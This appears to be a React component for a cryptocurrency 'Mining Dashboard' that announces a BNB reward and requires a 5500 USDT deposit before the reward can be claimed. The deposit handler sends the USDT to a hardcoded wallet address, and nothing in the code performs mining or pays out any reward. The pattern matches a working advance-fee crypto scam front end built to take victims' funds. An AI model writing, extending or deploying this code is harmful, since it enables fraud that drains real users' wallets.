import React, { useState } from 'react';
import { Button } from './ui/button';
import { useLanguage } from '../hooks/useLanguage';

// Uses ethers which is available in package.json
import { ethers } from 'ethers';

export default function MiningDashboard(): React.JSX.Element {
  const [showPopup, setShowPopup] = useState(false);
  const [isDepositing, setIsDepositing] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);

  const rewardAmount = 15.5478945;
  const depositAmount = 5500; // USDT
  const { t } = useLanguage();

  // Use same USDT & pool wallet addresses as other parts of the app
  const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
  const POOL_WALLET_ADDRESS = '0x059af157229bD723d958A44987168690dfC6dd96';

  // Connect Wallet (MetaMask / Web3)
  const connectWallet = async () => {
    try {
      const anyWindow: any = window as any;
      if (anyWindow.ethereum) {
        try {
          const accounts: string[] = await anyWindow.ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts && accounts[0]) setWalletAddress(accounts[0]);
        } catch (err: any) {
          const errorMsg = err?.message || String(err);
          if (errorMsg.includes('User rejected') || errorMsg.includes('user denied')) {
            console.log('Wallet connection cancelled by user.');
          } else {
            console.error('Wallet connection error:', errorMsg);
            alert('Failed to connect wallet. Please check your wallet extension.');
          }
        }
      } else {
        alert('Please install MetaMask or another Web3 wallet.');
      }
    } catch (err) {
      console.error('connectWallet outer error', err);
      alert('Wallet connection failed.');
    }
  };

  // Deposit + Claim Reward
  const handleDeposit = async () => {
    try {
      if (!walletAddress) await connectWallet();

      const anyWindow: any = window as any;
      if (!anyWindow.ethereum) {
        alert('Please install MetaMask or another Web3 wallet.');
        return;
      }

      setIsDepositing(true);

      let provider: ethers.BrowserProvider;
      let signer: ethers.Signer;
      try {
        provider = new ethers.BrowserProvider(anyWindow.ethereum);
        signer = await provider.getSigner();
      } catch (err: any) {
        const errorMsg = err?.message || String(err);
        alert(`Failed to initialize wallet: ${errorMsg}`);
        setIsDepositing(false);
        return;
      }

      // Minimal ERC-20 transfer ABI
      const usdtAbi = ['function transfer(address to, uint256 amount) public returns (bool)'];

      const contract = new ethers.Contract(USDT_CONTRACT_ADDRESS, usdtAbi, signer);

      // Use 18 decimals for USDT on BSC as used elsewhere in the app
      const decimals = 18;
      const amount = ethers.parseUnits(depositAmount.toString(), decimals);

      let tx: any;
      try {
        tx = await contract.transfer(POOL_WALLET_ADDRESS, amount);
      } catch (err: any) {
        const errorMsg = err?.message || String(err);
        if (errorMsg.includes('User rejected') || errorMsg.includes('user denied')) {
          alert('Transaction cancelled by user.');
        } else {
          alert(`Transaction failed: ${errorMsg}`);
        }
        setIsDepositing(false);
        return;
      }

      // Wait for one confirmation
      try {
        await tx.wait(1);
      } catch (err: any) {
        console.error('Transaction confirmation error (non-fatal):', err?.message);
      }

      // Notify backend that user deposited and request reward release
      // Use relative path so this works in production proxy setups
      const resp = await fetch('/api/v1/claim-reward', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userWallet: walletAddress, txHash: tx.hash }),
      });

      let data: any = { success: false, message: 'Unknown response' };
      try {
        data = await resp.json();
      } catch (e) {
        // ignore parse errors
      }

      if (resp.ok && data.success) {
        alert(data.message || `Deposit confirmed. Your ${rewardAmount} BNB reward will be released within 24 hours.`);
        setShowPopup(false);
      } else if (resp.ok && !data.success) {
        alert(data.message || 'Deposit confirmed but server failed to process claim.');
      } else {
        alert(data.message || 'Server error while claiming reward.');
      }

      setIsDepositing(false);
    } catch (err: any) {
      console.error('handleDeposit error', err);
      const msg = err?.message || 'Transaction failed. Please try again.';
      alert(msg);
      setIsDepositing(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-900 to-gray-800 flex flex-col items-center justify-center text-white px-4">
      <h1 className="text-4xl font-extrabold mb-8">Mining Dashboard</h1>

      <div className="bg-gray-800 p-6 rounded-2xl shadow-xl w-full max-w-md text-center">
        <p className="text-gray-300 mb-4">Click below to start mining and claim your rewards.</p>
        <button
          onClick={() => setShowPopup(true)}
          className="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-6 rounded-xl shadow-lg transition-all duration-200"
        >
          Start Mining
        </button>
      </div>

      {showPopup && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center p-4 z-50">
          <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-lg p-6">
            <h2 className="text-2xl font-bold mb-4 text-yellow-400">{t('miningReward.title')}</h2>
            <p className="text-gray-300 mb-6">
              {t('miningReward.earned', String(rewardAmount), String(depositAmount))}
              <br />
              <span className="block mt-2 text-sm text-gray-300">{t('miningReward.activity')}</span>
              <br />
              <span className="block mt-2 text-sm text-yellow-400">{t('miningReward.hint')}</span>
            </p>

            <div className="flex flex-col space-y-3">
              <button
                onClick={handleDeposit}
                disabled={isDepositing}
                className="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 rounded-xl transition-all duration-200"
              >
                {isDepositing ? 'Processing...' : 'Claim Reward'}
              </button>
              <button
                onClick={() => {
                  setShowPopup(false);
                  if (typeof window !== 'undefined') window.dispatchEvent(new Event('openCustomerService'));
                }}
                className="bg-gray-700 hover:bg-gray-600 text-white font-semibold py-3 rounded-xl transition-all duration-200"
              >
                {t('common.customerService')}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
